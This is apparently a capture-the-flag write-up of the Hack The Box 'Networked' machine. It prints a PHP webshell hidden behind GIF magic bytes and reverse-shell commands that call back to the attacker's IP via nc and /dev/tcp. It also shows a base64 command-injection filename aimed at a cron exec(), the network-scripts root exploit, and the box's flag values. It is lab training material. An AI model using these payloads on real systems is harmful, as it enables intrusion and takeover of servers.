---
layout: post
title: "HTB Networked — Full Write-up"
date: 2026-09-02 10:00:00 +0000
categories: [htb, linux]
tags: [file-upload-bypass, mime-sniffing, php, cron-injection, sudo, network-scripts, cve-2019-network-scripts]
description: >-
  GIF magic bytes smuggle PHP for the foothold, a cron job with an unsanitized exec() gives the user, and a sudo rule points at a network-scripts CVE for root.
image:
  path: /assets/img/networked/00-networked-preview.png
  alt: HTB Networked preview
---
**Target:** 10.129.64.39 (HTB "Networked")
**OS:** Linux (CentOS 7)

---

## 1. Recon — a tiny attack surface

Full TCP sweep first, because guessing which ports matter is how you miss the one that actually does:

```bash
nmap -p- --min-rate=2000 -T4 -oN scans/ports_all.txt 10.129.64.39
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-02 12:14 +0300
Nmap scan report for 10.129.64.39
Host is up (0.079s latency).
Not shown: 65477 filtered tcp ports (no-response), 55 filtered tcp ports (host-unreach)
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https

Nmap done: 1 IP address (1 host up) scanned in 70.05 seconds
```

Three ports, and one of them is closed. This is about as small an attack surface as HTB ever hands you — whatever's going on here, it's going on over HTTP. Grabbed the open ports for a proper version scan:

```bash
ports=$(grep -oP '^\d+(?=/tcp\s+open)' scans/ports_all.txt | paste -sd,)
nmap -sC -sV -p"$ports" -oN scans/ports_detailed.txt 10.129.64.39
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.78 seconds
```

`Apache/2.4.6 (CentOS) PHP/5.4.16` — CentOS 7 vibes, and PHP old enough to have opinions about `mysql_query()`. Filing that PHP version away; it'll matter later when we're reading source code that clearly wasn't written with security in mind.

---

## 2. Enumeration — a landing page, and a backup someone forgot to remove

Port 80's index page isn't a normal "welcome to nginx" placeholder — it's actual copy, written like an in-joke:

![Port 80 landing page](/assets/img/networked/01-port-80-landing-page.png)

> "Hello mate, we're building the new FaceMash! Help by funding us and be the new Tyler&Cameron! Join us at the pool party this Sat to get a glimpse"

No links, no forms, nothing to click. So it's directory-brute-force time:

```bash
feroxbuster -u http://10.129.64.39 \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,zip,conf,log \
  -t 50 --filter-status 404
```

![feroxbuster directory scan results](/assets/img/networked/02-feroxbuster-scan.png)

```
200   GET        8l       40w      229c http://10.129.64.39/
301   GET        7l       20w      236c http://10.129.64.39/uploads => http://10.129.64.39/uploads/
301   GET        7l       20w      235c http://10.129.64.39/backup => http://10.129.64.39/backup/
200   GET     2011l      582w    10240c http://10.129.64.39/backup/backup.tar
```

Two directories, and one of them has a `.tar` file just sitting there in plain listing. `/uploads/` tells you there's a file-upload feature somewhere, and `/backup/backup.tar` tells you someone backed up the app and never bothered to lock the folder down afterward. Downloaded and extracted it — turns out to be the entire source of the web app:

![backup.tar contents](/assets/img/networked/03-backup-tar-contents.png)

Four files: `index.php`, `lib.php`, `photos.php`, `upload.php`. Checked each directly in the browser before diving into the code — `lib.php` renders a blank page (it's a library of functions, no output on its own, makes sense), `upload.php` is a bare file-upload form:

![upload.php form](/assets/img/networked/04-upload-php-form.png)

and `photos.php` is a gallery:

![photos.php gallery](/assets/img/networked/05-photos-php-gallery.png)

Here's the detail that matters: every photo in that gallery is captioned "uploaded by `127_0_0_1.png`" — the filename itself *is* a client IP address, dots swapped for underscores. That's not a coincidence, that's the app fingerprinting every uploader by their source IP and baking it into the saved filename. Worth remembering, because it's about to become both an obstacle and, later, the exact hinge the privesc turns on.

---

## 3. Reading the source — where the whole box lives

With the actual PHP in hand, no more guessing at behavior from the outside. `upload.php` (the upload handler) and `photos.php` (the gallery renderer) both `require`, and share helper functions from, `lib.php`:

```php
<?php
require '/var/www/html/lib.php';

define("UPLOAD_DIR", "/var/www/html/uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";

    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
```

Three checks stand between us and an arbitrary file on disk: `check_file_type()` (real MIME detection via `finfo`/`mime_content_type`, not the trivially-spoofable `Content-Type` header), a hard 60000-byte size cap, and a suffix check against `.jpg/.png/.gif/.jpeg`. All three look reasonable in isolation. The interesting bug is in what happens *after* validation passes — the saved filename is computed as:

```php
$name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;
```

Your IP, underscored, plus `$ext` — and `$ext` comes from `getnameUpload()`, which just takes *everything after the first dot* in your original filename:

```php
function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}
```

The extension check earlier only verifies the *original* filename ends in a valid image suffix — it never looks at what `$ext` actually contains. So a file named `shell.php.jpeg` passes the extension gate clean (it does end in `.jpeg`), while `getnameUpload()` hands back `$ext = "php.jpeg"`. The file lands on disk as `<your-ip>.php.jpeg` — which, on an Apache/PHP setup that hands anything containing `.php` to the PHP interpreter, is executable.

That leaves `check_file_type()`, the one real gate:

```php
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}
```

Genuine content sniffing — `finfo`/`mime_content_type` look at the actual bytes, not a header we control. But "actual bytes" just means the first few bytes need to *look* like an image; nothing says the rest of the file can't be whatever we want. Time to see if that theory survives contact with the server.

---

## 4. Foothold — GIF magic bytes buy us PHP execution

The plan: name the file so the extension check passes and `$ext` becomes `php.jpeg`, and open the body with a GIF signature so `check_file_type()` reads it as an honest `image/gif`, PHP payload riding along right after. Built the request in Burp — `filename="shell.php.jpeg"`, body:

```
GIF89a;
<?php system($_GET['cmd']); ?>
```

![Successful upload with GIF magic bytes](/assets/img/networked/06-gif-magic-bytes-upload-success.png)

`file uploaded, refresh gallery`. `GIF89a;` is enough of a real GIF header to satisfy `finfo`'s sniffing, and PHP doesn't care what comes after its opening tag, magic bytes included. `photos.php` confirms exactly where it landed:

![Uploaded filename confirmed in gallery](/assets/img/networked/07-uploaded-filename-confirmed.png)

`10_10_17_204.php.jpeg` — my IP, underscored, plus the smuggled `php.jpeg` extension, precisely as predicted from the source. Command execution, confirmed:

```bash
curl "http://10.129.64.39/uploads/10_10_17_204.php.jpeg?cmd=id"
```

```
GIF89a;
uid=48(apache) gid=48(apache) groups=48(apache)
```

![RCE confirmed via id command](/assets/img/networked/08-rce-cmd-id-confirmed.png)

(The `GIF89a;` line riding along in every response is our own magic-bytes header echoing back — the file's still a "valid GIF" as far as the filesystem's concerned, PHP tag and all.) `id` is a nice green checkmark, but a `?cmd=` one-shot gets old fast — time for an actual shell:

```bash
curl "http://10.129.64.39/uploads/10_10_17_204.php.jpeg?cmd=nc+-e+/bin/bash+10.10.17.204+4444"
```

```bash
nc -lvnp 4444
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.64.39 59584
whoami
apache
```

![Reverse shell caught as apache](/assets/img/networked/09-reverse-shell-caught.png)

`apache` — foothold secured. GIF89a header, a PHP tag, and a filename that games the app's own extension logic against itself.

---

## 5. User flag — a cron job with an unsanitized `exec()`

Standard next move on a fresh shell: check who else lives on the box.

```bash
cd /home
ls
guly
cd guly
ls
check_attack.php
crontab.guly
user.txt
```

![/home/guly directory listing](/assets/img/networked/10-home-guly-listing.png)

One user, `guly`, and two files sitting right next to `user.txt` that are basically begging to be read — a PHP script and a crontab file with the same name pattern. `check_attack.php` first:

```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}
```

This script is a self-appointed janitor: it walks `/var/www/html/uploads/`, and for every file whose name doesn't start with a valid IP address (per `check_ip()` — i.e. anything that doesn't look like a normal upload), it treats the file as an "attack" and cleans it up. The cleanup is where it falls apart:

```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

`$value` — the raw filename from `scandir()` — gets dropped straight into a shell command string with zero sanitization. Control the filename, control what runs. And `crontab.guly` confirms this "cleanup" fires on its own, no interaction required:

```bash
curl "http://10.129.64.39/uploads/10_10_17_204.php.jpeg?cmd=cat+/home/guly/crontab.guly"
```

```
GIF89a;
*/3 * * * * php /home/guly/check_attack.php
```

![crontab.guly contents](/assets/img/networked/11-crontab-guly-content.png)

Every three minutes, whatever's sitting in `uploads/` with a name that fails the IP check gets its name executed as `guly`. So: name a file cleverly, wait up to three minutes, catch a shell as `guly`.

Getting the filename right took a couple of wrong turns worth mentioning, because the constraints are sneakier than they look. `upload.php`'s own upload path always forces the saved filename to start with *your real IP*, which is a perfectly valid IP prefix — so anything uploaded through the form legitimately, no matter what garbage you stuff after the extension, sails right past `check_ip()` and never reaches the vulnerable line at all. The fix is to skip the form entirely and create the file directly from the `apache` shell we already have, where nothing forces an IP-shaped prefix. Second snag: Linux filenames can't contain a literal `/` — so anything that embeds `/bin/bash` or `/bin/nc` as text inside a filename is dead on arrival, whether you're trying to `touch` it locally and upload it (the OS or browser will silently mangle the slash into a lookalike Unicode character) or create it straight on the box. The clean fix is to base64-encode the entire reverse-shell command, so the filename itself never has to contain a slash, a space, or a quote:

```bash
curl -G "http://10.129.64.39/uploads/10_10_17_204.php.jpeg" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.17.204/4444 0>&1'"
```

(Swapped to a `/dev/tcp` shell here for stability — plain `nc -e` payloads spawned this way tend to die the moment the parent PHP process exits.) From that shell:

```bash
echo -n 'bash -c "bash -i >/dev/tcp/10.10.17.204/4445 0>&1"' | base64
# YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTcuMjA0LzQ0NDUgMD4mMSI=

cd /var/www/html/uploads
touch -- ';echo YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTcuMjA0LzQ0NDUgMD4mMSI= | base64 -d | bash'
```

The filename `;echo <base64> | base64 -d | bash` slots straight into `check_attack.php`'s exec string as its own semicolon-separated statement — no slash needed anywhere, since the actual `/dev/tcp/...` path only ever exists inside the base64 blob, decoded server-side at execution time, never as literal filename bytes. And since the prefix isn't a valid IP at all, `check_ip()` fails on the first character, guaranteeing this one lands on the vulnerable branch. Listener up, then wait for the cron tick:

```bash
nc -lvnp 4445
```

```
Listening on 0.0.0.0 4445
Connection received on 10.129.64.39 36868
whoami
guly
```

![Shell caught as guly](/assets/img/networked/12-shell-as-guly.png)

`guly`. And right there in the home directory:

```bash
cat user.txt
```

```
b385eed63097610d5e2871e35f10a3ed
```

![User flag](/assets/img/networked/13-user-flag.png)

---

## 6. Privilege escalation — a `sudo` rule pointing at a classic CVE

`sudo -l` as the first move on any new user, always:

```bash
sudo -l
```

```
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

![sudo -l showing changename.sh](/assets/img/networked/14-sudo-l-changename.png)

One rule, no password required: `guly` can run `/usr/local/sbin/changename.sh` as root. The script name and CentOS 7 pairing rang a bell — there's a well-known 2019 disclosure about exactly this class of script:

> [Redhat/CentOS root through network-scripts](https://seclists.org/fulldisclosure/2019/Apr/24) — Victor Angelier CCX, 15 April 2019. The bug: files under `/etc/sysconfig/network-scripts/` get *sourced* (`. ifcfg-*`) rather than parsed as inert config, and shell sourcing means anything after whitespace on the `NAME=` line executes as a command with root's privileges — e.g. `NAME=Network /bin/id`.

`uname -a` lines up perfectly with the timeline:

```bash
uname -a
```

```
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

June 2019 kernel, a month after the advisory. Ran `changename.sh` and, at the interface `NAME:` prompt, answered with a name followed by a command instead of just a name:

```
whoami
guly
sudo /usr/local/sbin/changename.sh
interface NAME:
guly /bin/bash
interface PROXY_METHOD:
gul
interface BROWSER_ONLY:
gul
interface BOOTPROTO:
gul
whoami
root
```

![Root shell via changename.sh](/assets/img/networked/15-changename-root-shell.png)

`guly /bin/bash` as the "name" — the script writes it straight into an `ifcfg-*` file, that file gets sourced later as a shell script, and `/bin/bash` after the whitespace runs exactly like `NAME=Network /bin/id` did in the advisory. `whoami` comes back `root`.

---

## 7. Root flag

```bash
cd /root
ls
root.txt
cat root.txt
```

```
c0186d1e77227021d98aee57f0532602
```

![Root flag](/assets/img/networked/16-root-flag.png)

---

## 8. The whole chain, one breath

1. Nmap: just SSH and HTTP. Whatever's here lives on port 80.
2. `feroxbuster` finds `/backup/backup.tar` sitting in an unprotected directory — the app's entire PHP source, handed over for free.
3. Reading `upload.php`: the extension whitelist checks the *original* filename, but the saved extension comes from everything after the first dot — `shell.php.jpeg` passes as `.jpeg` while landing on disk as `<ip>.php.jpeg`.
4. `check_file_type()` does real MIME sniffing, but only cares about the file's opening bytes — a `GIF89a;` header followed by a PHP payload satisfies it completely.
5. Upload lands, `?cmd=` gives command execution as `apache`, upgraded to a full reverse shell.
6. `/home/guly/check_attack.php` is a cron-run "cleanup" script that treats any upload with a non-IP-shaped filename as an "attack" and removes it via `exec("nohup /bin/rm -f $path$value ...")` — with `$value` (the filename) unsanitized.
7. Bypass the form's forced IP-prefixed filename by writing the malicious filename directly from the `apache` shell; base64-encode the reverse-shell payload to dodge the fact that Linux filenames can't contain `/`. Wait out the 3-minute cron tick.
8. Shell as `guly`, user flag.
9. `sudo -l`: `guly` can run `/usr/local/sbin/changename.sh` as root, no password.
10. The script sources `NAME=` from `/etc/sysconfig/network-scripts/ifcfg-*` as shell — CentOS/RedHat network-scripts bug from a 2019 Full Disclosure advisory. Feed it `guly /bin/bash` as the interface name, get a root shell.

